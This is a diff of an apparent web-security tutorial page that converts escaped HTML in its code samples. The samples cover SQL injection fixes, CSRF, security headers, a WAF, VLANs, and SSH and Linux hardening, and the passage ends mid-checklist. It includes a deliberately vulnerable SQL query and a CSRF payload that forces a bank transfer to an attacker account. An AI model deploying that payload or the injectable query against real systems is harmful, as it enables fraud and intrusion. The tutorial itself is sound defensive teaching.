         <div class="code-container">
           <div class="code-header"><span class="lang-label">python</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
-          &lt;div class="code-block"&gt;&lt;span class="cmm"&gt;# VULNERABLE (DO NOT USE)&lt;/span&gt;
-&lt;span class="kw"&gt;def&lt;/span&gt; &lt;span class="fn"&gt;get_user&lt;/span&gt;(username):
-    query = &lt;span class="str"&gt;f"SELECT * FROM users WHERE username = '{username}'"&lt;/span&gt;
-    &lt;span class="kw"&gt;return&lt;/span&gt; db.execute(query)
+          <div class="code-block"><span class="cmm"># VULNERABLE (DO NOT USE)</span>
+<span class="kw">def</span> <span class="fn">get_user</span>(username):
+    query = <span class="str">f"SELECT * FROM users WHERE username = '{username}'"</span>
+    <span class="kw">return</span> db.execute(query)
 
-&lt;span class="cmm"&gt;# SECURE - Parameterized query&lt;/span&gt;
-&lt;span class="kw"&gt;def&lt;/span&gt; &lt;span class="fn"&gt;get_user&lt;/span&gt;(username):
-    query = &lt;span class="str"&gt;"SELECT * FROM users WHERE username = %s"&lt;/span&gt;
-    &lt;span class="kw"&gt;return&lt;/span&gt; db.execute(query, (username,))
+<span class="cmm"># SECURE - Parameterized query</span>
+<span class="kw">def</span> <span class="fn">get_user</span>(username):
+    query = <span class="str">"SELECT * FROM users WHERE username = %s"</span>
+    <span class="kw">return</span> db.execute(query, (username,))
 
-&lt;span class="cmm"&gt;# SECURE - With ORM (SQLAlchemy)&lt;/span&gt;
-&lt;span class="kw"&gt;from&lt;/span&gt; sqlalchemy.orm &lt;span class="kw"&gt;import&lt;/span&gt; Session
-&lt;span class="kw"&gt;def&lt;/span&gt; &lt;span class="fn"&gt;get_user&lt;/span&gt;(db: Session, username: str):
-    &lt;span class="kw"&gt;return&lt;/span&gt; db.query(User).filter(User.username == username).first()&lt;/div&gt;
+<span class="cmm"># SECURE - With ORM (SQLAlchemy)</span>
+<span class="kw">from</span> sqlalchemy.orm <span class="kw">import</span> Session
+<span class="kw">def</span> <span class="fn">get_user</span>(db: Session, username: str):
+    <span class="kw">return</span> db.query(User).filter(User.username == username).first()</div>
         </div>
       </section>
 
@@ -2335,15 +2335,15 @@ document.onkeypress = &lt;span class="kw"&gt;function&lt;/span&gt;(e) {
         </ol>
         <div class="code-container">
           <div class="code-header"><span class="lang-label">html</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
-          &lt;div class="code-block"&gt;&lt;span class="cmm"&gt;# CSRF attack payload (malicious website)&lt;/span&gt;
-&lt;&lt;span class="kw"&gt;form&lt;/span&gt; &lt;span class="var"&gt;action&lt;/span&gt;=&lt;span class="str"&gt;"https://bank.com/transfer"&lt;/span&gt; &lt;span class="var"&gt;method&lt;/span&gt;=&lt;span class="str"&gt;"POST"&lt;/span&gt; &lt;span class="var"&gt;id&lt;/span&gt;=&lt;span class="str"&gt;"csrf-form"&lt;/span&gt;&gt;
-  &lt;&lt;span class="kw"&gt;input&lt;/span&gt; &lt;span class="var"&gt;type&lt;/span&gt;=&lt;span class="str"&gt;"hidden"&lt;/span&gt; &lt;span class="var"&gt;name&lt;/span&gt;=&lt;span class="str"&gt;"to_account"&lt;/span&gt; &lt;span class="var"&gt;value&lt;/span&gt;=&lt;span class="str"&gt;"attacker_account"&lt;/span&gt;&gt;
-  &lt;&lt;span class="kw"&gt;input&lt;/span&gt; &lt;span class="var"&gt;type&lt;/span&gt;=&lt;span class="str"&gt;"hidden"&lt;/span&gt; &lt;span class="var"&gt;name&lt;/span&gt;=&lt;span class="str"&gt;"amount"&lt;/span&gt; &lt;span class="var"&gt;value&lt;/span&gt;=&lt;span class="str"&gt;"10000"&lt;/span&gt;&gt;
-&lt;/&lt;span class="kw"&gt;form&lt;/span&gt;&gt;
-&lt;&lt;span class="kw"&gt;script&lt;/span&gt;&gt;document.getElementById(&lt;span class="str"&gt;'csrf-form'&lt;/span&gt;).submit();&lt;/&lt;span class="kw"&gt;script&lt;/span&gt;&gt;
+          <div class="code-block"><span class="cmm"># CSRF attack payload (malicious website)</span>
+&lt;<span class="kw">form</span> <span class="var">action</span>=<span class="str">"https://bank.com/transfer"</span> <span class="var">method</span>=<span class="str">"POST"</span> <span class="var">id</span>=<span class="str">"csrf-form"</span>&gt;
+  &lt;<span class="kw">input</span> <span class="var">type</span>=<span class="str">"hidden"</span> <span class="var">name</span>=<span class="str">"to_account"</span> <span class="var">value</span>=<span class="str">"attacker_account"</span>&gt;
+  &lt;<span class="kw">input</span> <span class="var">type</span>=<span class="str">"hidden"</span> <span class="var">name</span>=<span class="str">"amount"</span> <span class="var">value</span>=<span class="str">"10000"</span>&gt;
+&lt;/<span class="kw">form</span>&gt;
+&lt;<span class="kw">script</span>&gt;document.getElementById(<span class="str">'csrf-form'</span>).submit();&lt;/<span class="kw">script</span>&gt;
 
-&lt;span class="cmm"&gt;# CSRF via image tag (GET request)&lt;/span&gt;
-&lt;&lt;span class="kw"&gt;img&lt;/span&gt; &lt;span class="var"&gt;src&lt;/span&gt;=&lt;span class="str"&gt;"https://bank.com/transfer?to=attacker&amount=10000"&lt;/span&gt; &lt;span class="var"&gt;width&lt;/span&gt;=&lt;span class="str"&gt;"0"&lt;/span&gt; &lt;span class="var"&gt;height&lt;/span&gt;=&lt;span class="str"&gt;"0"&lt;/span&gt;&gt;&lt;/div&gt;
+<span class="cmm"># CSRF via image tag (GET request)</span>
+&lt;<span class="kw">img</span> <span class="var">src</span>=<span class="str">"https://bank.com/transfer?to=attacker&amount=10000"</span> <span class="var">width</span>=<span class="str">"0"</span> <span class="var">height</span>=<span class="str">"0"</span>&gt;</div>
         </div>
         <h3>CSRF Prevention</h3>
         <ul>
@@ -2355,21 +2355,21 @@ document.onkeypress = &lt;span class="kw"&gt;function&lt;/span&gt;(e) {
         </ul>
         <div class="code-container">
           <div class="code-header"><span class="lang-label">python</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
-          &lt;div class="code-block"&gt;&lt;span class="cmm"&gt;# Flask-WTF CSRF protection example&lt;/span&gt;
-&lt;span class="kw"&gt;from&lt;/span&gt; flask_wtf.csrf &lt;span class="kw"&gt;import&lt;/span&gt; CSRFProtect
+          <div class="code-block"><span class="cmm"># Flask-WTF CSRF protection example</span>
+<span class="kw">from</span> flask_wtf.csrf <span class="kw">import</span> CSRFProtect
 
-&lt;span class="var"&gt;csrf&lt;/span&gt; = CSRFProtect(app)
+<span class="var">csrf</span> = CSRFProtect(app)
 
-&lt;span class="cmm"&gt;# In template:&lt;/span&gt;
-&lt;&lt;span class="kw"&gt;form&lt;/span&gt; &lt;span class="var"&gt;method&lt;/span&gt;=&lt;span class="str"&gt;"POST"&lt;/span&gt;&gt;
+<span class="cmm"># In template:</span>
+&lt;<span class="kw">form</span> <span class="var">method</span>=<span class="str">"POST"</span>&gt;
   {{ csrf_token() }}
-  &lt;&lt;span class="kw"&gt;input&lt;/span&gt; &lt;span class="var"&gt;type&lt;/span&gt;=&lt;span class="str"&gt;"text"&lt;/span&gt; &lt;span class="var"&gt;name&lt;/span&gt;=&lt;span class="str"&gt;"username"&lt;/span&gt;&gt;
-  &lt;&lt;span class="kw"&gt;button&lt;/span&gt; &lt;span class="var"&gt;type&lt;/span&gt;=&lt;span class="str"&gt;"submit"&lt;/span&gt;&gt;Submit&lt;/&lt;span class="kw"&gt;button&lt;/span&gt;&gt;
-&lt;/&lt;span class="kw"&gt;form&lt;/span&gt;&gt;
+  &lt;<span class="kw">input</span> <span class="var">type</span>=<span class="str">"text"</span> <span class="var">name</span>=<span class="str">"username"</span>&gt;
+  &lt;<span class="kw">button</span> <span class="var">type</span>=<span class="str">"submit"</span>&gt;Submit&lt;/<span class="kw">button</span>&gt;
+&lt;/<span class="kw">form</span>&gt;
 
-&lt;span class="cmm"&gt;# SameSite cookie configuration&lt;/span&gt;
-&lt;span class="var"&gt;app.config&lt;/span&gt;[&lt;span class="str"&gt;'SESSION_COOKIE_SAMESITE'&lt;/span&gt;] = &lt;span class="str"&gt;'Lax'&lt;/span&gt;
-&lt;span class="var"&gt;app.config&lt;/span&gt;[&lt;span class="str"&gt;'SESSION_COOKIE_SECURE'&lt;/span&gt;] = &lt;span class="str"&gt;True&lt;/span&gt;   &lt;span class="cmm"&gt;# HTTPS only&lt;/span&gt;&lt;/div&gt;
+<span class="cmm"># SameSite cookie configuration</span>
+<span class="var">app.config</span>[<span class="str">'SESSION_COOKIE_SAMESITE'</span>] = <span class="str">'Lax'</span>
+<span class="var">app.config</span>[<span class="str">'SESSION_COOKIE_SECURE'</span>] = <span class="str">True</span>   <span class="cmm"># HTTPS only</span></div>
         </div>
       </section>
 
@@ -2381,34 +2381,34 @@ document.onkeypress = &lt;span class="kw"&gt;function&lt;/span&gt;(e) {
         <h3>Security Headers</h3>
         <div class="code-container">
           <div class="code-header"><span class="lang-label">nginx</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
-          &lt;div class="code-block"&gt;&lt;span class="cmm"&gt;# Essential security headers in Nginx&lt;/span&gt;
-&lt;span class="kw"&gt;add_header&lt;/span&gt; &lt;span class="var"&gt;Content-Security-Policy&lt;/span&gt; &lt;span class="str"&gt;"default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self'; connect-src 'self'; frame-ancestors 'none'; base-uri 'self'; form-action 'self';"&lt;/span&gt; &lt;span class="kw"&gt;always&lt;/span&gt;;
-&lt;span class="kw"&gt;add_header&lt;/span&gt; &lt;span class="var"&gt;X-Frame-Options&lt;/span&gt; &lt;span class="str"&gt;"DENY"&lt;/span&gt; &lt;span class="kw"&gt;always&lt;/span&gt;;
-&lt;span class="kw"&gt;add_header&lt;/span&gt; &lt;span class="var"&gt;X-Content-Type-Options&lt;/span&gt; &lt;span class="str"&gt;"nosniff"&lt;/span&gt; &lt;span class="kw"&gt;always&lt;/span&gt;;
-&lt;span class="kw"&gt;add_header&lt;/span&gt; &lt;span class="var"&gt;X-XSS-Protection&lt;/span&gt; &lt;span class="str"&gt;"1; mode=block"&lt;/span&gt; &lt;span class="kw"&gt;always&lt;/span&gt;;
-&lt;span class="kw"&gt;add_header&lt;/span&gt; &lt;span class="var"&gt;Referrer-Policy&lt;/span&gt; &lt;span class="str"&gt;"strict-origin-when-cross-origin"&lt;/span&gt; &lt;span class="kw"&gt;always&lt;/span&gt;;
-&lt;span class="kw"&gt;add_header&lt;/span&gt; &lt;span class="var"&gt;Permissions-Policy&lt;/span&gt; &lt;span class="str"&gt;"geolocation=(), microphone=(), camera=()"&lt;/span&gt; &lt;span class="kw"&gt;always&lt;/span&gt;;
-&lt;span class="kw"&gt;add_header&lt;/span&gt; &lt;span class="var"&gt;Strict-Transport-Security&lt;/span&gt; &lt;span class="str"&gt;"max-age=31536000; includeSubDomains; preload"&lt;/span&gt; &lt;span class="kw"&gt;always&lt;/span&gt;;&lt;/div&gt;
+          <div class="code-block"><span class="cmm"># Essential security headers in Nginx</span>
+<span class="kw">add_header</span> <span class="var">Content-Security-Policy</span> <span class="str">"default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self'; connect-src 'self'; frame-ancestors 'none'; base-uri 'self'; form-action 'self';"</span> <span class="kw">always</span>;
+<span class="kw">add_header</span> <span class="var">X-Frame-Options</span> <span class="str">"DENY"</span> <span class="kw">always</span>;
+<span class="kw">add_header</span> <span class="var">X-Content-Type-Options</span> <span class="str">"nosniff"</span> <span class="kw">always</span>;
+<span class="kw">add_header</span> <span class="var">X-XSS-Protection</span> <span class="str">"1; mode=block"</span> <span class="kw">always</span>;
+<span class="kw">add_header</span> <span class="var">Referrer-Policy</span> <span class="str">"strict-origin-when-cross-origin"</span> <span class="kw">always</span>;
+<span class="kw">add_header</span> <span class="var">Permissions-Policy</span> <span class="str">"geolocation=(), microphone=(), camera=()"</span> <span class="kw">always</span>;
+<span class="kw">add_header</span> <span class="var">Strict-Transport-Security</span> <span class="str">"max-age=31536000; includeSubDomains; preload"</span> <span class="kw">always</span>;</div>
         </div>
         <h3>Web Application Firewall (WAF)</h3>
         <p>A WAF filters, monitors, and blocks HTTP traffic to and from a web application. It protects against SQL injection, XSS, CSRF, and other web attacks.</p>
         <div class="code-container">
           <div class="code-header"><span class="lang-label">nginx</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
-          &lt;div class="code-block"&gt;&lt;span class="cmm"&gt;# ModSecurity with OWASP CRS (Nginx)&lt;/span&gt;
-&lt;span class="cmm"&gt;# Install libmodsecurity and nginx connector&lt;/span&gt;
+          <div class="code-block"><span class="cmm"># ModSecurity with OWASP CRS (Nginx)</span>
+<span class="cmm"># Install libmodsecurity and nginx connector</span>
 
-&lt;span class="cmm"&gt;# In nginx.conf:&lt;/span&gt;
-&lt;span class="kw"&gt;modsecurity on&lt;/span&gt;;
-&lt;span class="kw"&gt;modsecurity_rules_file&lt;/span&gt; &lt;span class="var"&gt;/etc/nginx/modsec/main.conf&lt;/span&gt;;
+<span class="cmm"># In nginx.conf:</span>
+<span class="kw">modsecurity on</span>;
+<span class="kw">modsecurity_rules_file</span> <span class="var">/etc/nginx/modsec/main.conf</span>;
 
-&lt;span class="cmm"&gt;# /etc/nginx/modsec/main.conf:&lt;/span&gt;
-&lt;span class="kw"&gt;Include&lt;/span&gt; &lt;span class="var"&gt;/etc/nginx/modsec/modsecurity.conf&lt;/span&gt;
-&lt;span class="kw"&gt;Include&lt;/span&gt; &lt;span class="var"&gt;/usr/share/modsecurity-crs/crs-setup.conf&lt;/span&gt;
-&lt;span class="kw"&gt;Include&lt;/span&gt; &lt;span class="var"&gt;/usr/share/modsecurity-crs/rules/*.conf&lt;/span&gt;
+<span class="cmm"># /etc/nginx/modsec/main.conf:</span>
+<span class="kw">Include</span> <span class="var">/etc/nginx/modsec/modsecurity.conf</span>
+<span class="kw">Include</span> <span class="var">/usr/share/modsecurity-crs/crs-setup.conf</span>
+<span class="kw">Include</span> <span class="var">/usr/share/modsecurity-crs/rules/*.conf</span>
 
-&lt;span class="cmm"&gt;# Cloudflare WAF (managed service)&lt;/span&gt;
-&lt;span class="cmm"&gt;# AWS WAF&lt;/span&gt;
-&lt;span class="cmm"&gt;# Azure Front Door WAF&lt;/span&gt;&lt;/div&gt;
+<span class="cmm"># Cloudflare WAF (managed service)</span>
+<span class="cmm"># AWS WAF</span>
+<span class="cmm"># Azure Front Door WAF</span></div>
         </div>
         <h3>Additional Web Defense Measures</h3>
         <ul>
@@ -2440,7 +2440,7 @@ document.onkeypress = &lt;span class="kw"&gt;function&lt;/span&gt;(e) {
         <h3>Common Network Zones</h3>
         <div class="code-container">
           <div class="code-header"><span class="lang-label">network</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
-          &lt;div class="code-block"&gt;Internet
+          <div class="code-block">Internet
     |
     v
 [Edge Firewall] ------------------[VPN Gateway]
@@ -2458,32 +2458,32 @@ document.onkeypress = &lt;span class="kw"&gt;function&lt;/span&gt;(e) {
     +-- [Production VLAN]            +-- [Guest VLAN 50]
     +-- [Development VLAN]
     +-- [Management VLAN]
-    +-- [Backup VLAN]&lt;/div&gt;
+    +-- [Backup VLAN]</div>
         </div>
         <h3>VLAN Configuration (Cisco IOS)</h3>
         <div class="code-container">
           <div class="code-header"><span class="lang-label">cisco</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
-          &lt;div class="code-block"&gt;&lt;span class="cmm"&gt;! Create VLANs&lt;/span&gt;
-&lt;span class="kw"&gt;vlan&lt;/span&gt; &lt;span class="num"&gt;10&lt;/span&gt;
- &lt;span class="kw"&gt;name&lt;/span&gt; &lt;span class="var"&gt;Workstations&lt;/span&gt;
-&lt;span class="kw"&gt;vlan&lt;/span&gt; &lt;span class="num"&gt;20&lt;/span&gt;
- &lt;span class="kw"&gt;name&lt;/span&gt; &lt;span class="var"&gt;Servers&lt;/span&gt;
-&lt;span class="kw"&gt;vlan&lt;/span&gt; &lt;span class="num"&gt;30&lt;/span&gt;
- &lt;span class="kw"&gt;name&lt;/span&gt; &lt;span class="var"&gt;Database&lt;/span&gt;
-&lt;span class="kw"&gt;vlan&lt;/span&gt; &lt;span class="num"&gt;99&lt;/span&gt;
- &lt;span class="kw"&gt;name&lt;/span&gt; &lt;span class="var"&gt;Management&lt;/span&gt;
+          <div class="code-block"><span class="cmm">! Create VLANs</span>
+<span class="kw">vlan</span> <span class="num">10</span>
+ <span class="kw">name</span> <span class="var">Workstations</span>
+<span class="kw">vlan</span> <span class="num">20</span>
+ <span class="kw">name</span> <span class="var">Servers</span>
+<span class="kw">vlan</span> <span class="num">30</span>
+ <span class="kw">name</span> <span class="var">Database</span>
+<span class="kw">vlan</span> <span class="num">99</span>
+ <span class="kw">name</span> <span class="var">Management</span>
 
-&lt;span class="cmm"&gt;! Configure trunk port&lt;/span&gt;
-&lt;span class="kw"&gt;interface&lt;/span&gt; &lt;span class="var"&gt;GigabitEthernet0/1&lt;/span&gt;
- &lt;span class="kw"&gt;switchport&lt;/span&gt; &lt;span class="var"&gt;mode&lt;/span&gt; &lt;span class="var"&gt;trunk&lt;/span&gt;
- &lt;span class="kw"&gt;switchport&lt;/span&gt; &lt;span class="var"&gt;trunk&lt;/span&gt; &lt;span class="var"&gt;allowed&lt;/span&gt; &lt;span class="var"&gt;vlan&lt;/span&gt; &lt;span class="num"&gt;10,20,30,99&lt;/span&gt;
- &lt;span class="kw"&gt;switchport&lt;/span&gt; &lt;span class="var"&gt;trunk&lt;/span&gt; &lt;span class="var"&gt;native&lt;/span&gt; &lt;span class="var"&gt;vlan&lt;/span&gt; &lt;span class="num"&gt;99&lt;/span&gt;
+<span class="cmm">! Configure trunk port</span>
+<span class="kw">interface</span> <span class="var">GigabitEthernet0/1</span>
+ <span class="kw">switchport</span> <span class="var">mode</span> <span class="var">trunk</span>
+ <span class="kw">switchport</span> <span class="var">trunk</span> <span class="var">allowed</span> <span class="var">vlan</span> <span class="num">10,20,30,99</span>
+ <span class="kw">switchport</span> <span class="var">trunk</span> <span class="var">native</span> <span class="var">vlan</span> <span class="num">99</span>
 
-&lt;span class="cmm"&gt;! Configure access port&lt;/span&gt;
-&lt;span class="kw"&gt;interface&lt;/span&gt; &lt;span class="var"&gt;GigabitEthernet0/2&lt;/span&gt;
- &lt;span class="kw"&gt;switchport&lt;/span&gt; &lt;span class="var"&gt;mode&lt;/span&gt; &lt;span class="var"&gt;access&lt;/span&gt;
- &lt;span class="kw"&gt;switchport&lt;/span&gt; &lt;span class="var"&gt;access&lt;/span&gt; &lt;span class="var"&gt;vlan&lt;/span&gt; &lt;span class="num"&gt;10&lt;/span&gt;
- &lt;span class="kw"&gt;spanning-tree&lt;/span&gt; &lt;span class="var"&gt;portfast&lt;/span&gt;&lt;/div&gt;
+<span class="cmm">! Configure access port</span>
+<span class="kw">interface</span> <span class="var">GigabitEthernet0/2</span>
+ <span class="kw">switchport</span> <span class="var">mode</span> <span class="var">access</span>
+ <span class="kw">switchport</span> <span class="var">access</span> <span class="var">vlan</span> <span class="num">10</span>
+ <span class="kw">spanning-tree</span> <span class="var">portfast</span></div>
         </div>
         <div class="tip-box">
           <strong>Tip:</strong> Always change the <strong>native VLAN</strong> from the default (VLAN 1) to an unused VLAN. VLAN hopping attacks exploit the native VLAN to gain access to other VLANs.
@@ -2508,31 +2508,31 @@ document.onkeypress = &lt;span class="kw"&gt;function&lt;/span&gt;(e) {
         </ul>
         <div class="code-container">
           <div class="code-header"><span class="lang-label">bash</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
-          &lt;div class="code-block"&gt;&lt;span class="cmm"&gt;# Harden SSH on bastion host (/etc/ssh/sshd_config)&lt;/span&gt;
-&lt;span class="kw"&gt;PermitRootLogin&lt;/span&gt; &lt;span class="var"&gt;no&lt;/span&gt;
-&lt;span class="kw"&gt;PasswordAuthentication&lt;/span&gt; &lt;span class="var"&gt;no&lt;/span&gt;
-&lt;span class="kw"&gt;PubkeyAuthentication&lt;/span&gt; &lt;span class="var"&gt;yes&lt;/span&gt;
-&lt;span class="kw"&gt;AuthenticationMethods&lt;/span&gt; &lt;span class="var"&gt;publickey,keyboard-interactive&lt;/span&gt;
-&lt;span class="kw"&gt;ChallengeResponseAuthentication&lt;/span&gt; &lt;span class="var"&gt;yes&lt;/span&gt;
-&lt;span class="kw"&gt;UsePAM&lt;/span&gt; &lt;span class="var"&gt;yes&lt;/span&gt;
-&lt;span class="kw"&gt;AllowUsers&lt;/span&gt; &lt;span class="var"&gt;admin@10.0.0.* deploy@10.0.0.*&lt;/span&gt;
-&lt;span class="kw"&gt;MaxAuthTries&lt;/span&gt; &lt;span class="num"&gt;3&lt;/span&gt;
-&lt;span class="kw"&gt;ClientAliveInterval&lt;/span&gt; &lt;span class="num"&gt;300&lt;/span&gt;
-&lt;span class="kw"&gt;ClientAliveCountMax&lt;/span&gt; &lt;span class="num"&gt;2&lt;/span&gt;
-&lt;span class="kw"&gt;LogLevel&lt;/span&gt; &lt;span class="var"&gt;VERBOSE&lt;/span&gt;
+          <div class="code-block"><span class="cmm"># Harden SSH on bastion host (/etc/ssh/sshd_config)</span>
+<span class="kw">PermitRootLogin</span> <span class="var">no</span>
+<span class="kw">PasswordAuthentication</span> <span class="var">no</span>
+<span class="kw">PubkeyAuthentication</span> <span class="var">yes</span>
+<span class="kw">AuthenticationMethods</span> <span class="var">publickey,keyboard-interactive</span>
+<span class="kw">ChallengeResponseAuthentication</span> <span class="var">yes</span>
+<span class="kw">UsePAM</span> <span class="var">yes</span>
+<span class="kw">AllowUsers</span> <span class="var">admin@10.0.0.* deploy@10.0.0.*</span>
+<span class="kw">MaxAuthTries</span> <span class="num">3</span>
+<span class="kw">ClientAliveInterval</span> <span class="num">300</span>
+<span class="kw">ClientAliveCountMax</span> <span class="num">2</span>
+<span class="kw">LogLevel</span> <span class="var">VERBOSE</span>
 
-&lt;span class="cmm"&gt;# Configure Google Authenticator for MFA&lt;/span&gt;
-&lt;span class="fn"&gt;apt&lt;/span&gt; install libpam-google-authenticator
-&lt;span class="fn"&gt;google-authenticator&lt;/span&gt;
-&lt;span class="cmm"&gt;# Add to /etc/pam.d/sshd:&lt;/span&gt;
-&lt;span class="cmm"&gt;# auth required pam_google_authenticator.so&lt;/span&gt;
+<span class="cmm"># Configure Google Authenticator for MFA</span>
+<span class="fn">apt</span> install libpam-google-authenticator
+<span class="fn">google-authenticator</span>
+<span class="cmm"># Add to /etc/pam.d/sshd:</span>
+<span class="cmm"># auth required pam_google_authenticator.so</span>
 
-&lt;span class="cmm"&gt;# Session recording with script&lt;/span&gt;
-&lt;span class="cmm"&gt;# Add to /etc/profile or /etc/bash.bashrc:&lt;/span&gt;
-&lt;span class="fn"&gt;test&lt;/span&gt; -z &lt;span class="var"&gt;$SCRIPT&lt;/span&gt; && &lt;span class="var"&gt;SCRIPT&lt;/span&gt;=/var/log/sessions/&lt;span class="var"&gt;$(&lt;/span&gt;&lt;span class="fn"&gt;date&lt;/span&gt; +%Y%m%d-%H%M%S&lt;span class="var"&gt;)&lt;/span&gt;-&lt;span class="var"&gt;$USER&lt;/span&gt;-&lt;span class="var"&gt;$$&lt;/span&gt;.log && &lt;span class="fn"&gt;script&lt;/span&gt; -q &lt;span class="var"&gt;$SCRIPT&lt;/span&gt;
+<span class="cmm"># Session recording with script</span>
+<span class="cmm"># Add to /etc/profile or /etc/bash.bashrc:</span>
+<span class="fn">test</span> -z <span class="var">$SCRIPT</span> && <span class="var">SCRIPT</span>=/var/log/sessions/<span class="var">$(</span><span class="fn">date</span> +%Y%m%d-%H%M%S<span class="var">)</span>-<span class="var">$USER</span>-<span class="var">$$</span>.log && <span class="fn">script</span> -q <span class="var">$SCRIPT</span>
 
-&lt;span class="cmm"&gt;# Auto-logout idle sessions&lt;/span&gt;
-&lt;span class="kw"&gt;TMOUT&lt;/span&gt;=&lt;span class="num"&gt;600&lt;/span&gt;   &lt;span class="cmm"&gt;# 10 minutes&lt;/span&gt;&lt;/div&gt;
+<span class="cmm"># Auto-logout idle sessions</span>
+<span class="kw">TMOUT</span>=<span class="num">600</span>   <span class="cmm"># 10 minutes</span></div>
         </div>
       </section>
 
@@ -2580,66 +2580,66 @@ document.onkeypress = &lt;span class="kw"&gt;function&lt;/span&gt;(e) {
         <h3>Linux Server Hardening Checklist</h3>
         <div class="code-container">
           <div class="code-header"><span class="lang-label">bash</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
-          &lt;div class="code-block"&gt;&lt;span class="cmm"&gt;# 1. Keep system updated&lt;/span&gt;
-&lt;span class="fn"&gt;apt&lt;/span&gt; update && &lt;span class="fn"&gt;apt&lt;/span&gt; upgrade -y
-&lt;span class="fn"&gt;apt&lt;/span&gt; install unattended-upgrades
+          <div class="code-block"><span class="cmm"># 1. Keep system updated</span>
+<span class="fn">apt</span> update && <span class="fn">apt</span> upgrade -y
+<span class="fn">apt</span> install unattended-upgrades
 
-&lt;span class="cmm"&gt;# 2. Configure firewall (default deny)&lt;/span&gt;
-&lt;span class="fn"&gt;ufw&lt;/span&gt; default deny incoming
-&lt;span class="fn"&gt;ufw&lt;/span&gt; default allow outgoing
-&lt;span class="fn"&gt;ufw&lt;/span&gt; allow ssh
-&lt;span class="fn"&gt;ufw&lt;/span&gt; allow http
-&lt;span class="fn"&gt;ufw&lt;/span&gt; allow https
-&lt;span class="fn"&gt;ufw&lt;/span&gt; enable
+<span class="cmm"># 2. Configure firewall (default deny)</span>
+<span class="fn">ufw</span> default deny incoming
+<span class="fn">ufw</span> default allow outgoing
+<span class="fn">ufw</span> allow ssh
+<span class="fn">ufw</span> allow http
+<span class="fn">ufw</span> allow https
+<span class="fn">ufw</span> enable
 
-&lt;span class="cmm"&gt;# 3. Secure SSH&lt;/span&gt;
-&lt;span class="fn"&gt;sed&lt;/span&gt; -i &lt;span class="str"&gt;'s/#PermitRootLogin yes/PermitRootLogin no/'&lt;/span&gt; /etc/ssh/sshd_config
-&lt;span class="fn"&gt;sed&lt;/span&gt; -i &lt;span class="str"&gt;'s/#PasswordAuthentication yes/PasswordAuthentication no/'&lt;/span&gt; /etc/ssh/sshd_config
-&lt;span class="fn"&gt;sed&lt;/span&gt; -i &lt;span class="str"&gt;'s/#MaxAuthTries 6/MaxAuthTries 3/'&lt;/span&gt; /etc/ssh/sshd_config
-&lt;span class="fn"&gt;systemctl&lt;/span&gt; restart sshd
+<span class="cmm"># 3. Secure SSH</span>
+<span class="fn">sed</span> -i <span class="str">'s/#PermitRootLogin yes/PermitRootLogin no/'</span> /etc/ssh/sshd_config
+<span class="fn">sed</span> -i <span class="str">'s/#PasswordAuthentication yes/PasswordAuthentication no/'</span> /etc/ssh/sshd_config
+<span class="fn">sed</span> -i <span class="str">'s/#MaxAuthTries 6/MaxAuthTries 3/'</span> /etc/ssh/sshd_config
+<span class="fn">systemctl</span> restart sshd
 
-&lt;span class="cmm"&gt;# 4. Install and configure fail2ban&lt;/span&gt;
-&lt;span class="fn"&gt;apt&lt;/span&gt; install fail2ban
-&lt;span class="fn"&gt;systemctl&lt;/span&gt; enable --now fail2ban
+<span class="cmm"># 4. Install and configure fail2ban</span>
+<span class="fn">apt</span> install fail2ban
+<span class="fn">systemctl</span> enable --now fail2ban
 
-&lt;span class="cmm"&gt;# 5. Disable unnecessary services&lt;/span&gt;
-&lt;span class="fn"&gt;systemctl&lt;/span&gt; list-unit-files --type=service --state=enabled
-&lt;span class="fn"&gt;systemctl&lt;/span&gt; disable cups
-&lt;span class="fn"&gt;systemctl&lt;/span&gt; disable avahi-daemon
+<span class="cmm"># 5. Disable unnecessary services</span>
+<span class="fn">systemctl</span> list-unit-files --type=service --state=enabled
+<span class="fn">systemctl</span> disable cups
+<span class="fn">systemctl</span> disable avahi-daemon
 
-&lt;span class="cmm"&gt;# 6. Audit listening ports&lt;/span&gt;
-&lt;span class="fn"&gt;ss&lt;/span&gt; -tulpn
+<span class="cmm"># 6. Audit listening ports</span>
+<span class="fn">ss</span> -tulpn
 
-&lt;span class="cmm"&gt;# 7. File integrity monitoring (AIDE)&lt;/span&gt;
-&lt;span class="fn"&gt;apt&lt;/span&gt; install aide
-&lt;span class="fn"&gt;aideinit&lt;/span&gt;
-&lt;span class="fn"&gt;aide&lt;/span&gt; --check   &lt;span class="cmm"&gt;# Run checks periodically&lt;/span&gt;
+<span class="cmm"># 7. File integrity monitoring (AIDE)</span>
+<span class="fn">apt</span> install aide
+<span class="fn">aideinit</span>
+<span class="fn">aide</span> --check   <span class="cmm"># Run checks periodically</span>
 
-&lt;span class="cmm"&gt;# 8. Kernel hardening (sysctl)&lt;/span&gt;
-&lt;span class="fn"&gt;cat&lt;/span&gt; &lt;&lt; EOF &gt;&gt; /etc/sysctl.conf
-&lt;span class="cmm"&gt;# IP Spoofing protection&lt;/span&gt;
+<span class="cmm"># 8. Kernel hardening (sysctl)</span>
+<span class="fn">cat</span> << EOF >> /etc/sysctl.conf
+<span class="cmm"># IP Spoofing protection</span>
 net.ipv4.conf.all.rp_filter = 1
 net.ipv4.conf.default.rp_filter = 1
-&lt;span class="cmm"&gt;# Ignore ICMP redirects&lt;/span&gt;
+<span class="cmm"># Ignore ICMP redirects</span>
 net.ipv4.conf.all.accept_redirects = 0
 net.ipv6.conf.all.accept_redirects = 0
-&lt;span class="cmm"&gt;# Ignore source routed packets&lt;/span&gt;
+<span class="cmm"># Ignore source routed packets</span>
 net.ipv4.conf.all.accept_source_route = 0
 net.ipv6.conf.all.accept_source_route = 0
-&lt;span class="cmm"&gt;# Log martian packets&lt;/span&gt;
+<span class="cmm"># Log martian packets</span>
 net.ipv4.conf.all.log_martians = 1
-&lt;span class="cmm"&gt;# Disable IPv6 if not needed&lt;/span&gt;
